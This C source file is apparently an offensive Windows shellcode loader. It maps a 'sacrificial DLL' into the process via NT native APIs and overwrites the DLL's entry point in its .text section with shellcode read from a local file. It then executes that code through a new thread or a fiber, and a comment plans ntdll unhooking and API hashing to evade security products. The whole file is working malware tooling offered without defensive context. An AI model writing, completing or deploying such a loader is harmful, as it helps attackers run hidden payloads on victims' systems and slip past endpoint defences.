#define _CRT_SECURE_NO_WARNINGS
#include "main.h"
#include "structs.h"



/*-----------------------------------------------
  Initialize the NT apis that will be used
  TODO: implement ntdll unhooking from KnownDLLs,
  also use custom GetProcAddress along with 
  API hashing
-----------------------------------------------*/
BOOL InitAPIs() {

	HMODULE hModule = GetModuleHandleW(L"NTDLL");
	if (hModule == NULL) {
		DEBUG_PRINT("[!] Failed getting handle to ntdll\n");
		return FALSE;
	}

	NtAPIs.pNtClose = (fnNtClose)GetProcAddress(hModule, "NtClose");
	NtAPIs.pNtCreateFile = (fnNtCreateFile)GetProcAddress(hModule, "NtCreateFile");
	NtAPIs.pNtCreateSection = (fnNtCreateSection)GetProcAddress(hModule, "NtCreateSection");
	NtAPIs.pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hModule, "NtCreateThreadEx");
	NtAPIs.pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hModule, "NtMapViewOfSection");
	NtAPIs.pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hModule, "NtProtectVirtualMemory");
	NtAPIs.pNtWaitForSingleObject = (fnNtWaitForSingleObject)GetProcAddress(hModule, "NtWaitForSingleObject");
	NtAPIs.IsInitialized = TRUE;
	return TRUE;
}


/*------------------------------------------------
  Map the sacrificial DLL in the current process 
  and verify that the .text section is big enough
  for the shellcode
------------------------------------------------*/
BOOL MapAndCheckDLL(HMODULE* hModule, PULONG_PTR dllEntry, SIZE_T scSize) {

	if (!NtAPIs.IsInitialized) {
		if (!InitAPIs()) {
			DEBUG_PRINT("[!] Failed initializing NTAPI struct\n");
			return FALSE;
		}
	}

	NTSTATUS status = NULL;
	HANDLE hSection = NULL,
		hFile = NULL;
	SIZE_T ViewSize = 0, 
		sectionTextSize = 0,
		textOffsetSize = 0;
	ULONG_PTR dllBaseAddr = NULL,
		sectionTextAddr = NULL;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };
	OBJECT_ATTRIBUTES objAttr = { 0 };
	UNICODE_STRING uDllPath;


	uDllPath.Buffer = (PWSTR)SACRIFICIAL_DLL;
	uDllPath.Length = wcslen(uDllPath.Buffer) * sizeof(WCHAR);
	uDllPath.MaximumLength = uDllPath.Length + sizeof(WCHAR);

	InitializeObjectAttributes(&objAttr, &uDllPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	WDEBUG_PRINT(L"[*] Opening the supplied DLL: %s\n", SACRIFICIAL_DLL);
	//Read the DLL
	status = NtAPIs.pNtCreateFile(
		&hFile, 
		FILE_GENERIC_READ, 
		&objAttr, 
		&ioStatusBlock, 
		NULL, 
		FILE_ATTRIBUTE_NORMAL, 
		FILE_SHARE_READ, 
		FILE_OPEN, 
		FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, 
		NULL, 
		0);
	if (status != 0x00) {
		DEBUG_PRINT("[!] NtCreateFile failed: 0x%X\n", status);
		return FALSE;
	}

	DEBUG_PRINT("[*] Creating a memory section from the DLL\n");
	//Create a section from the DLL
	status = NtAPIs.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed creating section: 0x%X\n", status);
		NtAPIs.pNtClose(hFile);
		return FALSE;
	}

	NtAPIs.pNtClose(hFile);
	DEBUG_PRINT("[*] Mapping the section to the current process\n");
	//Map the created section
	status = NtAPIs.pNtMapViewOfSection(hSection, (HANDLE)-1, &dllBaseAddr, NULL, NULL, NULL, &ViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed mapping the section: 0x%X\n", status);
		NtAPIs.pNtClose(hSection);
		return FALSE;
	}

	//Parse the DLL's headers
	DEBUG_PRINT("[*] Searching for the DLL's entrypoint\n");
	PIMAGE_NT_HEADERS ntHdrs = (PIMAGE_NT_HEADERS)(dllBaseAddr + ((PIMAGE_DOS_HEADER)dllBaseAddr)->e_lfanew);
	if (ntHdrs->Signature != IMAGE_NT_SIGNATURE) {
		DEBUG_PRINT("[!] Failed getting the NT headers\n");
		NtAPIs.pNtClose(hSection);
		return FALSE;
	}

	//Check the size of the .text and verify that its large enough for the shellcode
	DEBUG_PRINT("[*] Getting the DLL's .text section size\n");
	PIMAGE_SECTION_HEADER pSectHdr = IMAGE_FIRST_SECTION(ntHdrs);

	for (DWORD i = 0; i < ntHdrs->FileHeader.NumberOfSections; i++) {
		if (strcmp(pSectHdr[i].Name, ".text") == 0) {
			DEBUG_PRINT("\t> .text section size: %d\n", pSectHdr[i].Misc.VirtualSize);
			sectionTextAddr = dllBaseAddr + pSectHdr[i].VirtualAddress;
			sectionTextSize = pSectHdr[i].Misc.VirtualSize;
		}
	}

	if (!sectionTextAddr || !sectionTextSize) {
		DEBUG_PRINT("[!] Could not find the .text section\n");
		NtAPIs.pNtClose(hSection);
		return FALSE;
	}

	// Calculate the size between the entry point and the end of the text section.
	textOffsetSize = sectionTextSize - ((dllBaseAddr + ntHdrs->OptionalHeader.AddressOfEntryPoint) - sectionTextAddr);

	//Check if the shellcode can fit
	if (textOffsetSize >= scSize) {
		DEBUG_PRINT("\t> Shellcode with size: %d will fit in the .text section of the DLL\n", scSize);
		*hModule = (HMODULE)dllBaseAddr;
		*dllEntry = dllBaseAddr + ntHdrs->OptionalHeader.AddressOfEntryPoint;
		return TRUE;
	}
	else {
		DEBUG_PRINT("[!] Sacrificial DLL's text section is too small for the shellcode\n");
	}

	return FALSE;
}


/*-------------------------------------------
  Inject the shellcode in the .text section
-------------------------------------------*/
BOOL WriteExec(ULONG_PTR dllEntry, PCONTENT cnt) {

	NTSTATUS status = NULL;
	DWORD old = 0;
	SIZE_T scSize = cnt->size;
	HANDLE hThread = NULL;


	DEBUG_PRINT("[*] Making the .text section writable\n");
	status = NtAPIs.pNtProtectVirtualMemory((HANDLE)-1, &dllEntry, &scSize, PAGE_READWRITE, &old);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed switching memory protection to RW: 0x%X\n", status);
		return FALSE;
	}

	DEBUG_PRINT("[*] Writing the shellcode\n");
	mymemcpy(dllEntry, cnt->data, cnt->size);

	DEBUG_PRINT("[*] Switching back to RX\n");
	status = NtAPIs.pNtProtectVirtualMemory((HANDLE)-1, &dllEntry, &scSize, old, &old);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed switching memory protection to RX: 0x%X\n", status);
		return FALSE;
	}

#ifdef FIBER_EXEC
	DEBUG_PRINT("[*] Creating fiber for execution\n");
	PVOID fiberAddr = CreateFiber(0x00, (LPFIBER_START_ROUTINE)dllEntry, NULL);
	if (!fiberAddr) {
		DEBUG_PRINT("[!] Failed creating fiber: %d\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("\t> Converting the main thread to fiber\n");
	PVOID pFiberAddr = ConvertThreadToFiber(NULL);
	if (!pFiberAddr) {
		DEBUG_PRINT("[!] Converting the main thread failed: %d\n", GetLastError());
		return FALSE;
	}

	DEBUG_PRINT("\t> Scheduling the fiber execution\n");
	SwitchToFiber(fiberAddr);
	return TRUE;

#elif !defined(FIBER_EXEC)
	DEBUG_PRINT("[*] Creating an execution thread from: 0x%p\n", dllEntry);
	status = NtAPIs.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, dllEntry, NULL, FALSE, 0x00, 0x00, 0x00, NULL);
	if (status != 0x00) {
		DEBUG_PRINT("[!] Failed creating new thread for execution\n");
		return FALSE;
	}

	NtAPIs.pNtWaitForSingleObject(hThread, FALSE, NULL);
	return TRUE;
#endif
}


/*------------------------
 Read the shellcode from 
 disk
-------------------------*/
BOOL ReadF(const char* file_path, PDWORD file_size, PVOID* read_buffer) {
	FILE* file;

	file = fopen(file_path, "rb");
	if (file == NULL) {
		DEBUG_PRINT("[!] Error opening file: %s", file_path);
		*file_size = 0;
		return FALSE;
	}

	fseek(file, 0, SEEK_END);
	*file_size = ftell(file);
	rewind(file);

	*read_buffer = (char*)malloc(*file_size);
	if (*read_buffer == NULL) {
		DEBUG_PRINT("[!] Memory allocation failed");
		fclose(file);
		return FALSE;
	}

	fread(*read_buffer, 1, *file_size, file);
	DEBUG_PRINT("[*] Reading shellcode from disk with size: %d\n", *file_size);
	fclose(file);
	return TRUE;
}


BOOL GetSC(PCONTENT cnt) {

	if (!ReadF(LOCAL_FILE, &(cnt->size), &(cnt->data))) {
		DEBUG_PRINT("[!] Failed reading the shellcode from disk.\n");
		return FALSE;
	}
	return TRUE;
}